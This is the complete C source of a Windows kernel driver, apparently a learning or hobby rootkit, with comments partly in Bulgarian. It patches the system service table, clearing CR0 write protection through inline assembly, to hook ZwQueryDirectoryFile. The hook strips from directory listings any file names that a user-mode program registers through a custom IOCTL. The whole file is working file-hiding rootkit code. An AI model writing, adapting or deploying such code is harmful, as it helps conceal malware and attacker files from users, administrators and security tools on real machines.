#include "ntddk.h"
#include <stdio.h>

#define BOOL int

#define IOCTL_HIDE_FILE \
		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_OUT_DIRECT, FILE_READ_DATA | FILE_WRITE_DATA)
#define	IOCTL_CLEAN_POOL \
		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_OUT_DIRECT, FILE_READ_DATA | FILE_WRITE_DATA)

#pragma pack(1)
typedef struct ServiceDescriptorEntry {
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase;
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

__declspec(dllimport) ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
#define SYSTEMSERVICE(_function) KeServiceDescriptorTable.ServiceTableBase[*(PULONG)((PUCHAR)_function+1)]

typedef struct _FILE_BOTH_DIR_INFORMATION {
	ULONG NextEntryOffset;
	ULONG FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG FileAttributes;
	ULONG FileNameLength;
	ULONG EaSize;
	CCHAR ShortNameLength;
	WCHAR ShortName[12];
	WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

NTSYSAPI NTSTATUS NTAPI ZwQueryDirectoryFile(IN HANDLE hFile,
											IN HANDLE hEvent OPTIONAL,
											IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
											IN PVOID IoApcContext OPTIONAL,
											OUT PIO_STATUS_BLOCK pIoStatusBlock,
											OUT PVOID FileInformationBuffer,
											IN ULONG FileInformationBufferLength,
											IN FILE_INFORMATION_CLASS FileInfoClass,
											IN BOOLEAN bReturnOnlyOneEntry,
											IN PUNICODE_STRING PathMask OPTIONAL,
											IN BOOLEAN bRestartQuery);

typedef NTSTATUS (*REALZWQUERYDIRECTORYFILE)(IN HANDLE hFile,
											IN HANDLE hEvent OPTIONAL,
											IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
											IN PVOID IoApcContext OPTIONAL,
											OUT PIO_STATUS_BLOCK pIoStatusBlock,
											OUT PVOID FileInformationBuffer,
											IN ULONG FileInformationBufferLength,
											IN FILE_INFORMATION_CLASS FileInfoClass,
											IN BOOLEAN bReturnOnlyOneEntry,
											IN PUNICODE_STRING PathMask OPTIONAL,
											IN BOOLEAN bRestartQuery);

REALZWQUERYDIRECTORYFILE RealZwQueryDirectoryFile;

typedef struct _FILE_NAME {
	PCHAR pcBuffer;
	LIST_ENTRY ListEntry;
} FILE_NAME, *PFILE_NAME;

LIST_ENTRY FileNamesHead;

NTSTATUS DispatchPassThrough(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp)
{
	NTSTATUS status = STATUS_NOT_SUPPORTED;
	
    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS SSDT_Hook_Create(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	return STATUS_SUCCESS;
}

NTSTATUS SSDT_Hook_Close(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	return STATUS_SUCCESS;
}

NTSTATUS SSDT_Hook_IoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	NTSTATUS status = STATUS_NOT_SUPPORTED;
    PIO_STACK_LOCATION pIoStackIrp = NULL;
    PCHAR pInputBuffer = NULL, pOutputBuffer = NULL;
	unsigned int uiDataSize = 0;
	PFILE_NAME pFileName;
	PLIST_ENTRY pFileNamesHead, pEntry;

    pIoStackIrp = IoGetCurrentIrpStackLocation(Irp);    

    if(pIoStackIrp) /* Никога не трябва да е NULL! */
    {
        switch(pIoStackIrp->Parameters.DeviceIoControl.IoControlCode)
        {
            case IOCTL_HIDE_FILE:
				status = STATUS_UNSUCCESSFUL;
                pInputBuffer = Irp->AssociatedIrp.SystemBuffer;
				if(Irp->MdlAddress) {
					pOutputBuffer = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority);
				}
				if (pInputBuffer && pOutputBuffer) {
					pFileName = (PFILE_NAME)ExAllocatePoolWithTag(PagedPool, sizeof(FILE_NAME), '  NF');
					uiDataSize = pIoStackIrp->Parameters.DeviceIoControl.InputBufferLength;
					pFileName->pcBuffer = (PCHAR)ExAllocatePoolWithTag(NonPagedPool, uiDataSize, ' fuB');
					RtlCopyMemory(pFileName->pcBuffer, pInputBuffer, uiDataSize);
					InsertTailList(&FileNamesHead, &pFileName->ListEntry);
					//DbgPrint("UserModeMessage = '%s'", pFileName->pcBuffer);
					uiDataSize = sizeof("File is hidden");
					RtlCopyMemory(pOutputBuffer, "File is hidden", uiDataSize);
					status = STATUS_SUCCESS;
				}
                break;
			case IOCTL_CLEAN_POOL:
				status = STATUS_UNSUCCESSFUL;
				if (Irp->MdlAddress) {
					pOutputBuffer = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority);
				}
				if (pInputBuffer && pOutputBuffer) {
					pFileNamesHead = &FileNamesHead;
					if (IsListEmpty(pFileNamesHead)) {
						uiDataSize = sizeof("List is already empty");
						RtlCopyMemory(pOutputBuffer, "List is already empty", uiDataSize);
					} else  {
						pEntry = pFileNamesHead->Flink;
						while (pEntry!=pFileNamesHead) {
							pFileName = CONTAINING_RECORD(pEntry, FILE_NAME, ListEntry);
							ExFreePoolWithTag(pFileName->pcBuffer, ' fuB');
							pEntry = pEntry->Flink;
							RemoveEntryList(&pFileName->ListEntry);
							ExFreePoolWithTag(pFileName, '  NF');
						}
						uiDataSize = sizeof("List successfully cleaned");
						RtlCopyMemory(pOutputBuffer, "List successfully cleaned", uiDataSize);
					}
					status = STATUS_SUCCESS;
				}
				break;
		}
	}
	
	Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = uiDataSize;

    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

VOID SSDT_Hook_DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING usDosDeviceName;
	PLIST_ENTRY pEntry;
	PLIST_ENTRY pFileNamesHead;
	PFILE_NAME pFileName;
	
	pFileNamesHead = &FileNamesHead;
	if (!IsListEmpty(pFileNamesHead)) {
		pEntry = pFileNamesHead->Flink;
		while (pEntry!=pFileNamesHead) {
			pFileName = CONTAINING_RECORD(pEntry, FILE_NAME, ListEntry);
			ExFreePoolWithTag(pFileName->pcBuffer, ' fuB');
			pEntry = pEntry->Flink;
			RemoveEntryList(&pFileName->ListEntry);
			ExFreePoolWithTag(pFileName, '  NF');
		}
	}
	
	RtlInitUnicodeString(&usDosDeviceName, L"\\DosDevices\\SSDT_Hook");
    IoDeleteSymbolicLink(&usDosDeviceName);
	
	if(DriverObject->DeviceObject!=NULL)
		IoDeleteDevice(DriverObject->DeviceObject);

	__asm
	{
		push eax
		mov eax, CR0
		and eax, 0FFFEFFFFh
		mov CR0, eax
		pop eax
	}

	(REALZWQUERYDIRECTORYFILE)(SYSTEMSERVICE(ZwQueryDirectoryFile)) = RealZwQueryDirectoryFile;

	__asm
	{
		push eax
		mov eax, CR0
		or eax, NOT 0FFFEFFFFh
		mov CR0, eax
		pop eax
	}
}


NTSTATUS HookZwQueryDirectoryFile(IN HANDLE hFile,
								IN HANDLE hEvent OPTIONAL,
								IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
								IN PVOID IoApcContext OPTIONAL,
								OUT PIO_STATUS_BLOCK pIoStatusBlock,
								OUT PVOID FileInformationBuffer,
								IN ULONG FileInformationBufferLength,
								IN FILE_INFORMATION_CLASS FileInfoClass,
								IN BOOLEAN bReturnOnlyOneEntry,
								IN PUNICODE_STRING PathMask OPTIONAL,
								IN BOOLEAN bRestartQuery)
{
	NTSTATUS rc;
	ANSI_STRING ansiFileName, ansiDirName, HideDirFile;
	UNICODE_STRING uniFileName;
	int iPos = 0, iLeft = 0;
	PFILE_BOTH_DIR_INFORMATION pFileInfo, pLastFileInfo;
	BOOL bLastOne;
	PLIST_ENTRY pEntry;
	PLIST_ENTRY pFileNamesHead;
	PFILE_NAME pFileName;

	rc = ((REALZWQUERYDIRECTORYFILE)(RealZwQueryDirectoryFile))(hFile,
																hEvent,
																IoApcRoutine,
																IoApcContext,
																pIoStatusBlock,
																FileInformationBuffer,
																FileInformationBufferLength,
																FileInfoClass,
																bReturnOnlyOneEntry,
																PathMask,
																bRestartQuery);
	
	pFileNamesHead = &FileNamesHead;
	if (IsListEmpty(pFileNamesHead)) {
		// DbgPrint("pFileNamesHead is Null");
		return rc;
	}

	if (NT_SUCCESS(rc)&&(FileInfoClass == FileBothDirectoryInformation)) {
		
		pEntry = pFileNamesHead->Flink;
		while (pEntry!=pFileNamesHead) {
			pFileName = CONTAINING_RECORD(pEntry, FILE_NAME, ListEntry);
			RtlInitAnsiString(&HideDirFile, pFileName->pcBuffer);
			// DbgPrint("FileToHide: %s", HideDirFile.Buffer);
			
			pFileInfo = (PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer;
			pLastFileInfo = NULL;
			do {
				bLastOne = !(pFileInfo->NextEntryOffset);
				RtlInitUnicodeString(&uniFileName,pFileInfo->FileName);
				RtlUnicodeStringToAnsiString(&ansiFileName,&uniFileName,TRUE);
				RtlUnicodeStringToAnsiString(&ansiDirName,&uniFileName,TRUE);
				RtlUpperString(&ansiFileName,&ansiDirName);
				// DbgPrint("Filename: %s\n", ansiFileName.Buffer);
				if(RtlCompareMemory(ansiFileName.Buffer, HideDirFile.Buffer, HideDirFile.Length) ==
					HideDirFile.Length) {
					// DbgPrint("Sega se skriva faila!\n");
					if(bLastOne) {
						if(pFileInfo == (PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer) {
							rc = 0x80000006;
						} else {
							pLastFileInfo->NextEntryOffset = 0;
						}
						break;
					} else {
						iPos = ((ULONG)pFileInfo) - (ULONG)FileInformationBuffer;
						iLeft = (ULONG)FileInformationBufferLength - iPos - pFileInfo->NextEntryOffset;
						RtlCopyMemory((PVOID)pFileInfo, (PVOID)((char*)pFileInfo + pFileInfo->NextEntryOffset),
									(ULONG)iLeft);
						continue;
					}
				}
				pLastFileInfo = pFileInfo;
				pFileInfo = (PFILE_BOTH_DIR_INFORMATION)((char*)pFileInfo + pFileInfo->NextEntryOffset);
				RtlFreeAnsiString(&ansiDirName);
				RtlFreeAnsiString(&ansiFileName);
			} while(!bLastOne);
		
			pEntry = pEntry->Flink;
		}

	}
	return(rc);
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
	NTSTATUS status = STATUS_SUCCESS;
	int uiIndex = 0;
	PDEVICE_OBJECT pDeviceObject = NULL;
	UNICODE_STRING usDriverName, usDosDeviceName;
	
    RtlInitUnicodeString(&usDriverName, L"\\Device\\SSDT_Hook");
    RtlInitUnicodeString(&usDosDeviceName, L"\\DosDevices\\SSDT_Hook");
	
	status = IoCreateDevice(DriverObject, 0, &usDriverName,
								FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN,
								FALSE, &pDeviceObject);
								
	InitializeListHead(&FileNamesHead);
	
	if (status == STATUS_SUCCESS) {
		for(uiIndex = 0; uiIndex < IRP_MJ_MAXIMUM_FUNCTION; uiIndex++)
			DriverObject->MajorFunction[uiIndex] = DispatchPassThrough;
		DriverObject->MajorFunction[IRP_MJ_CREATE]         = SSDT_Hook_Create;
		DriverObject->MajorFunction[IRP_MJ_CLOSE]          = SSDT_Hook_Close;
		DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = SSDT_Hook_IoControl;
		
		pDeviceObject->Flags |= DO_DIRECT_IO;
        pDeviceObject->Flags &= (~DO_DEVICE_INITIALIZING);
		
		DriverObject->DriverUnload = SSDT_Hook_DriverUnload;
		
		IoCreateSymbolicLink(&usDosDeviceName, &usDriverName);
	}

	__asm
	{
		push eax
		mov eax, CR0
		and eax, 0FFFEFFFFh
		mov CR0, eax
		pop eax
	}

	RealZwQueryDirectoryFile = (REALZWQUERYDIRECTORYFILE)(SYSTEMSERVICE(ZwQueryDirectoryFile));
	(REALZWQUERYDIRECTORYFILE)(SYSTEMSERVICE(ZwQueryDirectoryFile)) = HookZwQueryDirectoryFile;

	__asm
	{
		push eax
		mov eax, CR0
		or eax, NOT 0FFFEFFFFh
		mov CR0, eax
		pop eax
	}

	return status;
}
